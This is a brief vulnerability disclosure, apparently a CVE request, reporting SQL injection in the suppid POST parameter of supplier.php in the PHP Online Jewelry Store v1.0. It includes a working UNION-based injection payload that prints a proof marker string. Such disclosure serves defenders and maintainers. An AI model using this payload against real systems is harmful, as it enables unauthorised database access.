# Online Jewelry Store v1.0 has SQL injection

BUG_Author：likaiwen

Website source address: https://www.sourcecodester.com/php/14631/online-jewelry-store-php-full-source-code.html

Vulnerability File: /jewerly_0/supplier.php

Vulnerability location: /jewerly_0/supplier.php POST parameters suppid.

Payload: suppid=-1' union all select null,null,concat(0x75767778,0x616263),null,null-- -

The union query is successful, and the string "uvwxabc" appears as expected, which proves that there is a SQL injection vulnerability

![image](https://github.com/raozhir/CVERequest/blob/main/1.png)
